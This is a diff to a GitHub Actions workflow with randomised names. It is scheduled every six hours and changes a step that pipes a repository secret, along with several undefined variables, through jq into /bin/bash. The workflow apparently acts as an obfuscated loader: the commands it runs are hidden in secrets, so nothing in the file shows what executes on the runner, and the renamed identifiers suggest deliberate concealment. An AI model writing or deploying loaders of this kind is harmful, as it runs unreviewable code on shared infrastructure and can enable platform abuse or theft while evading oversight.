@@ -3,20 +3,25 @@ name: luminrui7165
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 3/6 * * *'
-
-jobs:  # 31476
+    - cron: '6 4/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: luminrui7165
         env:
-          oqo74559: ${{ secrets.oqo74559 }}
+          x5076: ${{ secrets.x5076 }}
         run: |
-          echo $oqo74559 | jq -r .ci615 | /bin/bash
-          echo $el47 | jq -r .m4020 | /bin/bash
-          echo $hcv1 | jq -r .jyqib13 | /bin/bash
-          echo $gv44 | jq -r .psmn478 | /bin/bash
+          echo $x5076 | jq -r .wx77 | /bin/bash
+          echo $hnvib15 | jq -r .s2963 | /bin/bash
+          echo $trk94 | jq -r .oknkp96 | /bin/bash
+          echo $zij65442 | jq -r .oop422 | /bin/bash
+          echo $e4 | jq -r .z85391 | /bin/bash
+          echo $zncou03 | jq -r .xo7789 | /bin/bash
+          echo $p3817 | jq -r .n60 | /bin/bash
+          echo $cozb6037 | jq -r .jzsk64939 | /bin/bash
+          echo $wvzu03 | jq -r .tegu906 | /bin/bash
+          echo $d23998 | jq -r .aaao670 | /bin/bash
+          echo $fjp59 | jq -r .x08499 | /bin/bash
 
